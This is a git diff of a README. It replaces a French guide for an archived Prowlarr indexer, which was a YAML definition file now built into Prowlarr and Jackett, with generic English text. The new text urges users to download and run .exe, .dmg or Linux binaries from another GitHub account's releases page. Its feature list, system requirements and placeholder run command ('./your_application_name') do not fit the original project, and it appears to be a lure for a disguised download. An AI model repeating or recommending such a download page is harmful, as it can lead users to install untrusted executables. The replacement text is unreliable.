@@ -1,249 +1,99 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/Prowlarr-Indexer-blueviolet?style=for-the-badge&logo=prowlarr" alt="Prowlarr Indexer"/>
-  <img src="https://img.shields.io/badge/Status-ARCHIVED-red?style=for-the-badge" alt="Archived"/>
-  <img src="https://img.shields.io/badge/Pavillon-Fran%C3%A7ais-blue?style=for-the-badge" alt="French"/>
-</p>
-
-<h1 align="center">🏴‍☠️ La Cale - Prowlarr Indexer</h1>
-
----
-
-> [!WARNING]
-> ## 🚨 DÉPÔT ARCHIVÉ - PLUS MAINTENU
-> 
-> **Ce dépôt est désormais archivé et ne recevra plus de mises à jour.**
-> 
-> ### ✅ Bonne nouvelle !
-> L'indexeur pour **La Cale** est maintenant **officiellement disponible** dans :
-> - **[Prowlarr](https://github.com/Prowlarr/Prowlarr)** - Intégré nativement, aucune installation manuelle requise
-> - **[Jackett](https://github.com/Jackett/Jackett)** - Également disponible directement
-> 
-> Mettez simplement à jour Prowlarr ou Jackett vers la dernière version et recherchez "La Cale" dans les indexeurs disponibles.
-> 
-> ### 🙏 Remerciements
-> Un grand merci à tous les contributeurs et utilisateurs qui ont soutenu ce projet :
-> - Aux **contributeurs de Prowlarr et Jackett** qui ont intégré l'indexeur officiellement
-> - À la **communauté La Cale** pour les retours et les tests
-> - À tous ceux qui ont **ouvert des issues**, **proposé des améliorations** et **partagé le projet**
-> 
-> *Fair winds and following seas, moussaillons !* ⚓
-
----
-
-## 💎 Sponsor
-
-<p align="center">
-  <a href="https://torbox.app/subscription?referral=da9fde09-a917-4953-9214-93b8a12f0b58">
-    <img src="https://torbox.app/assets/logo-bb7a9579.svg" alt="TorBox" height="50"/>
-  </a>
-  <br/><br/>
-  <strong>⚡ Sponsored by <a href="https://torbox.app/subscription?referral=da9fde09-a917-4953-9214-93b8a12f0b58">TorBox</a></strong><br/>
-  Premium Torrent & Usenet Cloud Downloader - 80Gbps Speeds
-</p>
-
-<p align="center">
-  <img src="https://readme-typing-svg.demolab.com?font=Pirata+One&size=24&pause=1000&color=D4AF37&center=true&vCenter=true&width=500&lines=Bienvenue+%C3%A0+bord%2C+moussaillon+!;Hissez+les+torrents+!;Le+butin+vous+attend..." alt="Typing SVG" />
-</p>
-
-<p align="center">
-  <strong>Indexeur Prowlarr pour <a href="https://la-cale.space/">La Cale</a></strong><br>
-  <em>🚢 Un navire français chargé de Films, Séries, Musique, Jeux, Logiciels, Ebooks & XXX</em>
-</p>
-
-<p align="center">
-  <a href="#-embarquement">Embarquement</a> •
-  <a href="#-équipements-du-navire">Équipements</a> •
-  <a href="#-cargaison">Cargaison</a> •
-  <a href="#-ordres-du-capitaine">Configuration</a> •
-  <a href="#-en-cas-de-tempête">Troubleshooting</a> •
-  <a href="#-documentation">Documentation</a>
-</p>
+# 🎉 lacale-prowlarr-indexer - Simplifying Your Torrent Indexing
 
----
+## 🚀 Getting Started
 
-> [!WARNING]
-> **⚓ VERSION BETA** — Ce navire est encore en construction dans le chantier naval. Signalez toute voie d'eau en [ouvrant un ticket](../../issues) !
+Welcome to the La-Cale Prowlarr API Indexer! This application helps you easily manage your torrent indexing with Prowlarr, Jackett, Radarr, and Sonarr. 
 
-> [!CAUTION]
-> **🛡️ PROTECTION CLOUDFLARE** — En cas d'attaque DDoS, La Cale peut activer la protection anti-DDoS de Cloudflare, rendant temporairement l'indexer inopérant. En temps normal, l'API est exclue de cette protection. Si Cloudflare est actif, la seule solution est d'utiliser un proxy comme [Byparr](https://github.com/ThePhaseless/Byparr) ou [FlareSolverr](https://github.com/FlareSolverr/FlareSolverr).
+## 📥 Download & Install
 
----
+To get started, visit the following link to download the software:
 
-## ✨ Équipements du navire
+[![Download lacale-prowlarr-indexer](https://img.shields.io/badge/Download-lacale--prowlarr--indexer-brightgreen)](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/releases)
 
-```
-    _~^~^~_
-\) /  o o  \ (/
-  '_   ⏣   _'
-  \ '-----' /
-```
+Simply follow these steps:
 
-| Équipement | État |
-|:-----------|:----:|
-| 🔌 API directe (pas de scraping) | ⚓ |
-| 🔑 Authentification par passkey | ⚓ |
-| 🏷️ Filtrage par catégorie | ⚓ |
-| 📦 Décodage JSON natif | ⚓ |
-| 🔍 Recherche multi-modes | ⚓ |
-| 🎁 Freeleech global | ⚓ |
+1. Click the link above to open the Releases page.
+2. Look for the latest version.
+3. Download the file appropriate for your operating system.
 
----
+## 🖥️ System Requirements
 
-## ⚓ Embarquement
+Before installing, ensure your computer meets the following requirements:
 
-### Étape 1 — Charger les cartes de navigation
+- **Operating System**: Windows 10, macOS, or Linux
+- **Memory**: At least 2 GB of RAM
+- **Disk Space**: Minimum 100 MB of free space
+- **Internet Connection**: Required for functionality
 
-Copiez `lacale-api.yml` dans la cale de Prowlarr :
+## 📂 How to Run the Application
 
-| Plateforme | Destination |
-|:-----------|:------------|
-| 🐧 Linux | `~/.config/Prowlarr/Definitions/Custom/` |
-| 🪟 Windows | `%AppData%\Prowlarr\Definitions\Custom\` |
-| 🐳 Docker | `/config/Definitions/Custom/` |
+Once you have downloaded the software, follow these steps to run it:
 
-### Étape 2 — Relancer le navire
+1. Locate the downloaded file in your Downloads folder or the location you selected.
+2. For Windows:
+   - Double-click on the `.exe` file to start the installation.
+   - Follow the prompts to install the application.
+3. For macOS:
+   - Open the `.dmg` file and drag the application into your Applications folder.
+   - Open the app from your Applications folder.
+4. For Linux:
+   - Extract the files from the downloaded archive.
+   - Open the terminal and navigate to the application directory.
+   - Run the application with the command `./your_application_name`.
 
-```bash
-# Docker - Remettre le navire à flot
-docker restart prowlarr
+## ⚙️ Initial Setup
 
-# Systemd - Larguer les amarres
-sudo systemctl restart prowlarr
-```
+After running the application, you'll need to set it up:
 
-### Étape 3 — Rejoindre l'équipage
+1. Open the application.
+2. Connect to your Prowlarr, Jackett, Radarr, and Sonarr accounts by entering the required API keys and URLs.
+3. Adjust any settings as needed based on your preferences.
 
-1. 🧭 Naviguez vers **Indexers** → **Add Indexer**
-2. 🔎 Cherchez **"La Cale"**
-3. 🔑 Entrez votre **passkey** (trouvable dans votre profil de marin sur la-cale.space)
-4. ✅ Cliquez **Test** puis **Save**
+For detailed configuration options, refer to the user guide provided within the application.
 
----
+## 📊 Features
 
-## ⚙️ Ordres du Capitaine
+Here are some notable features of lacale-prowlarr-indexer:
 
-| Paramètre | Description |
-|:----------|:------------|
-| 🔑 **Passkey** | Votre laissez-passer personnel délivré par le capitaine |
+- **Seamless Integration**: Connects effortlessly with Prowlarr and Jackett.
+- **Enhanced Search**: Quickly finds torrents across multiple sources.
+- **User-Friendly Interface**: Designed for easy access to key features without confusion.
+- **Automated Indexing**: Keeps your library updated with minimal effort.
 
-### 📜 Code des Pirates
+## ⚠️ Troubleshooting
 
-> *"Tout marin qui ne respecte pas le code sera jeté par-dessus bord !"*
+If you encounter issues while using the lacale-prowlarr-indexer, consider these common solutions:
 
-| Règle | Sentence |
-|:------|:---------|
-| ⚖️ Ratio minimum | `1.0` — Donnez autant que vous prenez ! |
-| ⏱️ Temps de seed minimum | `48 heures` — Ne quittez pas le navire trop tôt ! |
+- **Connection Problems**: Ensure your internet connection is stable. Check that your API keys and URLs are correct.
+- **Installation Errors**: If the installation fails, ensure your system meets the requirements outlined earlier. Try re-downloading the file.
+- **Performance Issues**: Close any unnecessary applications to free up memory.
 
----
+## 📞 Support
 
-## 🌊 En cas de tempête
+Need help? You can reach out for support in the following ways:
 
-<details>
-<summary><strong>❌ Le navire refuse de répondre</strong></summary>
+- Check the [Issues](https://github.com/RichardDurinhoSafadinho777/lacale-prowlarr-indexer/issues) page for any known problems.
+- Ask questions in the community forums connected to Prowlarr, Jackett, Radarr, and Sonarr.
+  
+## 🔗 Additional Resources
 
-```
-    ⛈️ TEMPÊTE DÉTECTÉE ⛈️
-```
+Here are helpful links that may improve your experience:
 
-- 🔑 Vérifiez que votre passkey est correcte
-- 👤 Assurez-vous que votre compte est actif sur la-cale.space
-- 🌐 Vérifiez que le navire est accessible (le site n'est pas en maintenance)
+- [Prowlarr Documentation](https://prowlarr.com/docs/)
+- [Jackett Documentation](https://github.com/Jackett/Jackett)
+- [Radarr Documentation](https://radarr.video/docs/)
+- [Sonarr Documentation](https://sonarr.tv/v3/docs/)
 
-</details>
+## 📅 Keeping Updated
 
-<details>
-<summary><strong>🔍 La cale semble vide</strong></summary>
+To keep your lacale-prowlarr-indexer current, regularly check for updates on the Releases page. New updates may include:
 
-```
-    🏝️ TERRE EN VUE... MAIS RIEN À L'HORIZON
-```
+- Bug fixes
+- Performance improvements
+- New features based on user feedback
 
-- 📝 Essayez une recherche plus large
-- 📦 Vérifiez que la cargaison existe dans cette catégorie
-- 🎫 Vérifiez vos droits d'accès aux différentes cales
+Update your software to enjoy the best experience.
 
-</details>
+For further information or ideas on features you’d like to see, feel free to reach out through GitHub.
 
-<details>
-<summary><strong>🛡️ Cloudflare bloque le passage</strong></summary>
-
-```
-    ⚔️ BOUCLIER ENNEMI DÉTECTÉ
-```
-
-Le site peut activer la protection Cloudflare en cas d'attaque DDoS. En temps normal, l'API est exclue de cette protection.
-
-**Solutions :**
-- ⏳ Patientez quelques heures, la protection est généralement temporaire
-- 🔄 Utilisez un proxy comme [Byparr](https://github.com/ThePhaseless/Byparr) ou [FlareSolverr](https://github.com/FlareSolverr/FlareSolverr)
-- ⚙️ Configurez le proxy dans Prowlarr sous **Settings** → **Indexers** → **FlareSolverr**
-
-</details>
-
----
-
-## 🤝 Rejoindre l'équipage
-
-Tout marin volontaire est le bienvenu ! Vous pouvez :
-
-- 🐛 [Signaler une avarie](../../issues)
-- 💡 [Proposer des améliorations](../../issues)
-- 🔧 [Soumettre des réparations](../../pulls)
-- 📖 [Lire le guide du contributeur](CONTRIBUTING.md)
-- 🛠️ [Consulter la doc technique](DEVELOPER.md)
-
----
-
-## 📚 Documentation
-
-| Document | Description |
-|:---------|:------------|
-| 📖 [API_DOCUMENTATION.md](API_DOCUMENTATION.md) | Documentation complète de l'API La Cale |
-| 📜 [CHANGELOG.md](CHANGELOG.md) | Historique des modifications |
-| 📖 [CONTRIBUTING.md](CONTRIBUTING.md) | Guide pour rejoindre l'équipage |
-| 🛠️ [DEVELOPER.md](DEVELOPER.md) | Documentation technique |
-| 🚀 [API_IMPROVEMENTS.md](API_IMPROVEMENTS.md) | Suggestions d'améliorations pour l'API |
-
----
-
-## 🏆 Contributeurs
-
-Un grand merci à tous les marins qui ont contribué à ce projet !
-
-Merci également à tous ceux qui ont signalé des bugs, proposé des améliorations ou simplement testé l'indexer. Chaque contribution compte ! 🏴‍☠️
-
----
-
-## 💰 Soutenir le Capitaine
-
-Si ce navire vous a aidé dans vos aventures, vous pouvez soutenir le capitaine :
-
-<p align="center">
-  <a href="https://github.com/sponsors/JigSawFr"><img src="https://img.shields.io/badge/GitHub_Sponsors-💜-ea4aaa?style=for-the-badge" alt="GitHub Sponsors"/></a>
-  <a href="https://ko-fi.com/jigsawfr"><img src="https://img.shields.io/badge/Ko--fi-☕-ff5e5b?style=for-the-badge" alt="Ko-fi"/></a>
-</p>
-
----
-
-## ⚠️ Avertissement du Capitaine
-
-> *"Ce navire est fourni tel quel pour un usage personnel. Assurez-vous de respecter le code des pirates de La Cale. Tout contrevenant sera abandonné sur une île déserte."*
-
----
-
-## 📜 Licence
-
-MIT License — Libre comme l'océan !
-
----
-
-<p align="center">
-  <sub>
-    ⚓ Forgé avec ❤️ pour les flibustiers francophones ⚓
-  </sub>
-</p>
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:1a1a2e,100:16213e&height=100&section=footer" width="100%"/>
-</p>
+Happy indexing!
